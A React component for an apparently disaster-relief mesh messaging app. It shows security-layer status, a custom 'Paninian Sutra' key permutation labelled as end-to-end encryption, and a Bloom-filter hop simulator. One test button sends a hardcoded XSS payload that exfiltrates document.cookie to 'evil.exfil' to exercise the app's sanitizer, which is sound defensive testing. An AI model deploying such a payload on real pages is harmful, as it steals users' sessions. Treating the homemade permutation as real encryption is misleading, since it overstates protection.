import React, { useEffect, useState } from 'react';
import {
  Activity,
  CheckCircle2,
  Key,
  Lock,
  Play,
  RefreshCw,
  RotateCcw,
  ShieldAlert,
  ShieldCheck,
  StepForward,
  Trash2,
} from 'lucide-react';
import {
  BLOOM_BIT_SIZE,
  BloomHopTrace,
  MAX_MESH_HOPS,
  PaninianKeyState,
  RamRelayPacket,
  createEmptyBloomFilter,
  permuteWithPaninianKey,
  sealWithWebCryptoAesGcm,
  testAndInsertBloom,
} from '../utils/securityEngine';

interface SecurityProtocolLabProps {
  paninianKey: PaninianKeyState;
  lamportClock: number;
  deviceId: string;
  x25519PublicKey: string;
  keysLocked: boolean;
  ramRelayCache: RamRelayPacket[];
  onPurgeRamCache: () => void;
  onRotatePaninianEpoch: () => void;
  onLogBloomSimulation: (summary: string) => void;
  onIncomingMeshPacketTest: (rawPayload: string) => void;
}

const MESH_NODE_CATALOG = [
  'Sector-9 Relay',
  'Metro-Gate Node',
  'Hospital Roof',
  'Bridge Beacon',
  'Relief Shelter-04',
  'Campus Tower',
  'Water-Plant Mesh',
  'Fire-Station Node',
  'Rail-Yard Repeater',
  'Destination Gateway',
];

export const SecurityProtocolLab: React.FC<SecurityProtocolLabProps> = ({
  paninianKey,
  lamportClock,
  deviceId,
  x25519PublicKey,
  keysLocked,
  ramRelayCache,
  onPurgeRamCache,
  onRotatePaninianEpoch,
  onLogBloomSimulation,
  onIncomingMeshPacketTest,
}) => {
  const [samplePlaintext, setSamplePlaintext] = useState('Need clean water at Sector 4 bridge');
  const ciphertextHex = keysLocked
    ? 'KEYS-LOCKED-BY-RASP-INTEGRITY-SHIELD'
    : permuteWithPaninianKey(samplePlaintext, paninianKey, lamportClock);

  const [serverVerifyStatus, setServerVerifyStatus] = useState<string | null>(null);
  const [validatingServer, setValidatingServer] = useState(false);
  const [webCryptoSeal, setWebCryptoSeal] = useState<{
    algorithm: string;
    ivHex: string;
    ciphertextHex: string;
    sha256: string;
  } | null>(null);

  useEffect(() => {
    let cancelled = false;
    if (keysLocked || !samplePlaintext.trim()) {
      setWebCryptoSeal(null);
      return;
    }
    sealWithWebCryptoAesGcm(samplePlaintext, `${paninianKey.keyId}:${paninianKey.epoch}`).then(
      (res) => {
        if (!cancelled) setWebCryptoSeal(res);
      }
    );
    return () => {
      cancelled = true;
    };
  }, [samplePlaintext, paninianKey.keyId, paninianKey.epoch, keysLocked]);

  // Bloom-Filter 50-Hop Jumping Jack Packet Simulator State
  const [packetId, setPacketId] = useState('PKT-JJ-5042');
  const [bloomBits, setBloomBits] = useState<number[]>(() => createEmptyBloomFilter());
  const [hopTraces, setHopTraces] = useState<BloomHopTrace[]>([]);
  const [currentHop, setCurrentHop] = useState<number>(0);
  const [simCompleted, setSimCompleted] = useState<boolean>(false);

  const handleServerPaninianValidate = async () => {
    if (keysLocked || validatingServer) return;
    setValidatingServer(true);
    setServerVerifyStatus(null);
    try {
      const resp = await fetch('/api/security/paninian-validate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          epoch: paninianKey.epoch,
          keyId: paninianKey.keyId,
          plaintext: samplePlaintext,
          clientCipherHex: ciphertextHex,
          lamportSeq: lamportClock,
        }),
      });
      const data = await resp.json();
      if (resp.ok && data.valid) {
        setServerVerifyStatus(
          `Server Edge Validated (${data.sutra}) · Signature ${data.serverSignature}`
        );
      } else {
        setServerVerifyStatus(data.error || 'Server cipher validation failed.');
      }
    } catch {
      setServerVerifyStatus('Server validation endpoint unreachable.');
    } finally {
      setValidatingServer(false);
    }
  };

  const stepSingleHop = (
    hopIdx: number,
    currentBits: number[]
  ): { nextBits: number[]; trace: BloomHopTrace } => {
    const nodeNum =
      hopIdx === MAX_MESH_HOPS
        ? 9
        : hopIdx % 9 === 0 && hopIdx > 0
        ? (hopIdx / 9) % MESH_NODE_CATALOG.length
        : (hopIdx * 7 + 3) % (MESH_NODE_CATALOG.length - 1);
    const nodeId = `NODE-${String(nodeNum + 1).padStart(2, '0')}`;
    const nodeLabel = MESH_NODE_CATALOG[nodeNum];

    const { alreadySeen, bitIndices, nextFilter } = testAndInsertBloom(
      currentBits,
      packetId,
      nodeId
    );

    const status: BloomHopTrace['status'] =
      hopIdx >= MAX_MESH_HOPS
        ? 'DELIVERED'
        : alreadySeen
        ? 'BLOOM_SUPPRESSED_LOOP'
        : 'FORWARDED';

    const trace: BloomHopTrace = {
      hopNumber: hopIdx,
      nodeId,
      nodeLabel,
      packetId,
      status,
      bitIndices,
      distanceKm: Number((hopIdx * 0.4).toFixed(1)),
    };

    return { nextBits: nextFilter, trace };
  };

  const handleStepHop = () => {
    if (currentHop >= MAX_MESH_HOPS) return;
    const nextHop = currentHop + 1;
    const { nextBits, trace } = stepSingleHop(nextHop, bloomBits);
    setBloomBits(nextBits);
    setHopTraces((prev) => [trace, ...prev]);
    setCurrentHop(nextHop);
    if (nextHop === MAX_MESH_HOPS) {
      setSimCompleted(true);
      onLogBloomSimulation(
        `50-hop Jumping Jack simulation completed for ${packetId}; Bloom filter guarded loop echoes.`
      );
    }
  };

  const handleRunAll50Hops = () => {
    let bits = createEmptyBloomFilter();
    const traces: BloomHopTrace[] = [];
    let suppressedCount = 0;
    for (let h = 1; h <= MAX_MESH_HOPS; h++) {
      const { nextBits, trace } = stepSingleHop(h, bits);
      bits = nextBits;
      if (trace.status === 'BLOOM_SUPPRESSED_LOOP') suppressedCount++;
      traces.unshift(trace);
    }
    setBloomBits(bits);
    setHopTraces(traces);
    setCurrentHop(MAX_MESH_HOPS);
    setSimCompleted(true);
    onLogBloomSimulation(
      `50-hop Jumping Jack burst (${packetId}) finished: ${suppressedCount} loop echoes suppressed across 128-bit Bloom array.`
    );
  };

  const handleResetSim = () => {
    setBloomBits(createEmptyBloomFilter());
    setHopTraces([]);
    setCurrentHop(0);
    setSimCompleted(false);
  };

  const setBitCount = bloomBits.filter((b) => b === 1).length;
  const suppressedTotal = hopTraces.filter((t) => t.status === 'BLOOM_SUPPRESSED_LOOP').length;

  const fiveLayers = [
    {
      layer: 'Layer 1',
      name: 'OTP + Password + Device-ID Binding',
      proof: `Bound to ${deviceId}`,
    },
    {
      layer: 'Layer 2',
      name: 'X25519 + Paninian Sutra E2EE + Lamport Ordering',
      proof: keysLocked
        ? 'LOCKED BY RASP INTEGRITY SHIELD'
        : `${x25519PublicKey} · L#${String(lamportClock).padStart(3, '0')}`,
    },
    {
      layer: 'Layer 3',
      name: 'Duress PIN Silent Alert & Zero-Trace RAM Cache',
      proof: `${ramRelayCache.length} volatile packets in RAM (0 disk trace)`,
    },
    {
      layer: 'Layer 4',
      name: 'Automated Threat Keyword Filter + RASP Sanitizer',
      proof: 'Active real-time interception & device lock',
    },
    {
      layer: 'Layer 5',
      name: 'Server Edge /gov-vault + Firebase Auth & Firestore Rules',
      proof: 'Zero master secrets in client bundle · Owner-only Firestore access',
    },
  ];

  return (
    <div className="space-y-6 w-full max-w-full min-w-0 overflow-x-hidden">
      {/* 5-Layer Security Seal Verification Matrix */}
      <section className="vaak-surface rounded-2xl p-4 sm:p-6 space-y-4 min-w-0 w-full overflow-hidden">
        <div className="flex flex-wrap items-center justify-between gap-3">
          <div className="min-w-0 flex-1">
            <h3 className="font-display text-base sm:text-lg font-semibold text-white flex items-center gap-2">
              {keysLocked ? (
                <Lock className="w-5 h-5 text-rose-400" />
              ) : (
                <ShieldCheck className="w-5 h-5 text-emerald-400" />
              )}
              <span>5-Layer Hardened Security Seal</span>
            </h3>
            <p className="text-xs text-slate-400">
              Zero client-bundle secrets · Server-side Edge HMAC &amp; strict Firebase Firestore rules
            </p>
          </div>
          <button
            type="button"
            onClick={onPurgeRamCache}
            className="min-h-[38px] px-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-xs font-semibold text-amber-300 flex items-center gap-1.5 cursor-pointer"
          >
            <Trash2 className="w-3.5 h-3.5" />
            <span>Purge Zero-Trace RAM Cache</span>
          </button>
        </div>

        <div className="divide-y divide-slate-800 rounded-xl bg-[#0B1120] border border-slate-800">
          {fiveLayers.map((item) => (
            <div
              key={item.layer}
              className="px-4 py-3 flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-xs"
            >
              <div className="flex items-center gap-2.5">
                <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                <span className="font-mono-tabular text-blue-400 font-semibold">{item.layer}</span>
                <span className="font-semibold text-white">{item.name}</span>
              </div>
              <span className="font-mono-tabular text-slate-300 sm:text-right break-all">{item.proof}</span>
            </div>
          ))}
        </div>
      </section>

      {/* 1. X25519 + Paninian Sutra Dynamic Key-Permutation + Server Edge Validation */}
      <section className="vaak-surface rounded-2xl p-4 sm:p-6 space-y-4 min-w-0 w-full overflow-hidden">
        <div className="flex flex-wrap items-center justify-between gap-3">
          <div className="min-w-0 flex-1">
            <h3 className="font-display text-base sm:text-lg font-semibold text-white flex items-center gap-2">
              <Key className="w-5 h-5 text-blue-400" />
              <span>X25519 + Paninian Sutra E2EE (Server Edge Validated)</span>
            </h3>
            <p className="text-xs text-slate-400">
              Client permutes payloads locally; Server Edge Function validates Sutra HMAC without exposing salt
            </p>
          </div>
          <div className="flex flex-wrap items-center gap-2">
            <button
              type="button"
              disabled={keysLocked || validatingServer}
              onClick={handleServerPaninianValidate}
              className="min-h-[40px] px-3.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 disabled:bg-slate-700 text-white text-xs font-semibold cursor-pointer"
            >
              {validatingServer ? 'Validating...' : 'Validate Cipher on Server'}
            </button>
            <button
              type="button"
              disabled={keysLocked}
              onClick={onRotatePaninianEpoch}
              className="min-h-[40px] px-3.5 rounded-xl bg-[#2563EB] hover:bg-blue-500 disabled:bg-slate-700 text-white text-xs font-semibold flex items-center gap-1.5 cursor-pointer"
            >
              <RefreshCw className="w-3.5 h-3.5" />
              <span>Rotate Epoch</span>
            </button>
          </div>
        </div>

        {serverVerifyStatus && (
          <div className="p-3 rounded-xl bg-emerald-950/40 border border-emerald-500/30 text-xs text-emerald-200 font-mono-tabular break-words">
            {serverVerifyStatus}
          </div>
        )}

        <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
          <div className="p-3.5 rounded-xl bg-[#0B1120] border border-slate-800 space-y-1">
            <p className="text-[11px] text-slate-400">Active Maheshvara Sutra</p>
            <p className="text-lg font-bold text-white">
              #{paninianKey.sutra.index} · {paninianKey.sutra.sanskrit}
            </p>
            <p className="text-xs text-blue-400 font-mono-tabular">
              {paninianKey.sutra.translit} (Pratyahara: {paninianKey.pratyaharaSlice})
            </p>
          </div>

          <div className="p-3.5 rounded-xl bg-[#0B1120] border border-slate-800 space-y-1">
            <p className="text-[11px] text-slate-400">Key ID &amp; Lamport Clock</p>
            <p className="font-mono-tabular text-base font-bold text-emerald-400">
              {keysLocked ? 'LOCKED' : `${paninianKey.keyId} · L#${String(lamportClock).padStart(3, '0')}`}
            </p>
            <p className="font-mono-tabular text-xs text-slate-400">
              {paninianKey.x25519EphemeralPub}
            </p>
          </div>

          <div className="p-3.5 rounded-xl bg-[#0B1120] border border-slate-800 space-y-1">
            <p className="text-[11px] text-slate-400">256-Bit Digest</p>
            <p className="font-mono-tabular text-xs text-slate-200 break-all">
              {keysLocked ? 'ZEROIZED UNTIL RASP RESTORE' : paninianKey.hexDigest}
            </p>
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-3 pt-2">
          <div className="space-y-1">
            <label className="text-xs text-slate-300">Live Payload Input</label>
            <input
              type="text"
              value={samplePlaintext}
              onChange={(e) => setSamplePlaintext(e.target.value)}
              className="w-full min-h-[42px] px-3 rounded-xl bg-[#0B1120] border border-slate-700 text-xs text-white focus:outline-none focus:border-blue-500"
            />
          </div>
          <div className="space-y-1">
            <label className="text-xs text-slate-300">
              Permuted Cipher (Lamport L#{String(lamportClock).padStart(3, '0')})
            </label>
            <div className="min-h-[42px] px-3 py-2 rounded-xl bg-[#0B1120] border border-slate-800 font-mono-tabular text-xs text-emerald-300 break-all flex items-center">
              {ciphertextHex || '—'}
            </div>
          </div>
        </div>

        {webCryptoSeal && !keysLocked && (
          <div className="p-3.5 rounded-xl bg-[#0B1120] border border-emerald-500/25 space-y-1 font-mono-tabular text-[11px]">
            <p className="text-emerald-400 font-semibold">
              Web Crypto Hardware Seal ({webCryptoSeal.algorithm}) · IV: {webCryptoSeal.ivHex}
            </p>
            <p className="text-slate-300 break-all">
              Ciphertext: {webCryptoSeal.ciphertextHex.slice(0, 64)}...
            </p>
            <p className="text-sky-300 break-all">SHA-256: {webCryptoSeal.sha256}</p>
          </div>
        )}
      </section>

      {/* 2. Bloom-Filter 50-Hop Jumping Jack Packet Simulator + Incoming Malware Sanitizer Test */}
      <section className="vaak-surface rounded-2xl p-4 sm:p-6 space-y-4 min-w-0 w-full overflow-hidden">
        <div className="flex flex-wrap items-center justify-between gap-3">
          <div className="min-w-0 flex-1">
            <h3 className="font-display text-base sm:text-lg font-semibold text-white flex items-center gap-2">
              <Activity className="w-5 h-5 text-blue-400 shrink-0" />
              <span className="break-words">Bloom-Filter 50-Hop Jumping Jack Simulator</span>
            </h3>
            <p className="text-xs text-slate-400">
              128-bit probabilistic filter ({BLOOM_BIT_SIZE} bits, k=3) + RASP incoming packet sanitizer
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2 min-w-0">
            <input
              type="text"
              value={packetId}
              onChange={(e) => setPacketId(e.target.value)}
              aria-label="Packet ID"
              className="w-28 sm:w-32 min-h-[38px] px-2.5 rounded-lg bg-[#0B1120] border border-slate-700 font-mono-tabular text-xs text-white"
            />
            <button
              type="button"
              onClick={handleStepHop}
              disabled={currentHop >= MAX_MESH_HOPS}
              className="min-h-[38px] px-3 rounded-lg bg-slate-800 hover:bg-slate-700 disabled:opacity-40 text-xs font-semibold text-white flex items-center gap-1 cursor-pointer"
            >
              <StepForward className="w-3.5 h-3.5" />
              <span>Step Hop</span>
            </button>
            <button
              type="button"
              onClick={handleRunAll50Hops}
              className="min-h-[38px] px-3 rounded-lg bg-[#2563EB] hover:bg-blue-500 text-xs font-semibold text-white flex items-center gap-1 cursor-pointer"
            >
              <Play className="w-3.5 h-3.5" />
              <span>Run 50-Hop Burst</span>
            </button>
            <button
              type="button"
              onClick={() =>
                onIncomingMeshPacketTest('<script>fetch("https://evil.exfil/steal?c="+document.cookie)</script>')
              }
              className="min-h-[38px] px-3 rounded-lg bg-amber-600/20 hover:bg-amber-600/30 border border-amber-500/40 text-xs font-semibold text-amber-300 flex items-center gap-1 cursor-pointer"
            >
              <ShieldAlert className="w-3.5 h-3.5" />
              <span>Test Malicious Mesh Packet</span>
            </button>
            <button
              type="button"
              onClick={handleResetSim}
              className="min-h-[38px] px-2.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 cursor-pointer"
              aria-label="Reset Bloom simulator"
            >
              <RotateCcw className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>

        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs">
          <div className="p-3 rounded-xl bg-[#0B1120] border border-slate-800">
            <span className="text-slate-400">Hops Executed</span>
            <p className="font-mono-tabular text-lg font-bold text-white mt-0.5">
              {currentHop} / {MAX_MESH_HOPS}
            </p>
          </div>
          <div className="p-3 rounded-xl bg-[#0B1120] border border-slate-800">
            <span className="text-slate-400">Bloom Bits Set</span>
            <p className="font-mono-tabular text-lg font-bold text-blue-400 mt-0.5">
              {setBitCount} / {BLOOM_BIT_SIZE}
            </p>
          </div>
          <div className="p-3 rounded-xl bg-[#0B1120] border border-slate-800">
            <span className="text-slate-400">Loops Suppressed</span>
            <p className="font-mono-tabular text-lg font-bold text-amber-300 mt-0.5">
              {suppressedTotal}
            </p>
          </div>
          <div className="p-3 rounded-xl bg-[#0B1120] border border-slate-800">
            <span className="text-slate-400">Span Distance</span>
            <p className="font-mono-tabular text-lg font-bold text-emerald-400 mt-0.5">
              {(currentHop * 0.4).toFixed(1)} km
            </p>
          </div>
        </div>

        <div className="space-y-1.5">
          <p className="text-xs text-slate-400">128-Bit Bloom Filter Matrix (k=3 FNV hashes)</p>
          <div className="grid grid-cols-8 sm:grid-cols-16 gap-1 p-2.5 rounded-xl bg-[#0B1120] border border-slate-800">
            {bloomBits.map((bit, i) => (
              <div
                key={i}
                title={`Bit ${i}: ${bit}`}
                className={`h-3.5 rounded-sm transition-colors ${
                  bit === 1 ? 'bg-blue-500' : 'bg-slate-800/80'
                }`}
              />
            ))}
          </div>
        </div>

        {simCompleted && (
          <div className="p-3 rounded-xl bg-emerald-950/40 border border-emerald-500/30 text-xs text-emerald-200 flex items-center gap-2">
            <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0" />
            <span>
              Packet {packetId} traversed 50 Jumping-Jack hops (20.0 km mesh span) with {suppressedTotal} duplicate loop echoes dropped.
            </span>
          </div>
        )}

        <div className="max-h-48 overflow-y-auto divide-y divide-slate-800/70 rounded-xl bg-[#0B1120] border border-slate-800">
          {hopTraces.length === 0 ? (
            <p className="p-4 text-xs text-slate-500 text-center">
              Click &ldquo;Step Hop&rdquo; or &ldquo;Run 50-Hop Burst&rdquo; to trace Jumping Jack packet routing.
            </p>
          ) : (
            hopTraces.map((trace) => (
              <div key={trace.hopNumber} className="px-3.5 py-2 flex items-center justify-between gap-2 text-xs">
                <div className="flex items-center gap-2.5 min-w-0">
                  <span className="font-mono-tabular text-slate-400 shrink-0">
                    Hop #{String(trace.hopNumber).padStart(2, '0')}
                  </span>
                  <span className="text-slate-100 font-medium truncate">
                    {trace.nodeId} ({trace.nodeLabel})
                  </span>
                </div>
                <div className="flex items-center gap-2 shrink-0 font-mono-tabular">
                  <span className="text-slate-500 hidden sm:inline">
                    bits [{trace.bitIndices.join(',')}]
                  </span>
                  <span
                    className={
                      trace.status === 'DELIVERED'
                        ? 'text-emerald-400 font-semibold'
                        : trace.status === 'BLOOM_SUPPRESSED_LOOP'
                        ? 'text-amber-300'
                        : 'text-blue-400'
                    }
                  >
                    {trace.status}
                  </span>
                </div>
              </div>
            ))
          )}
        </div>
      </section>
    </div>
  );
};
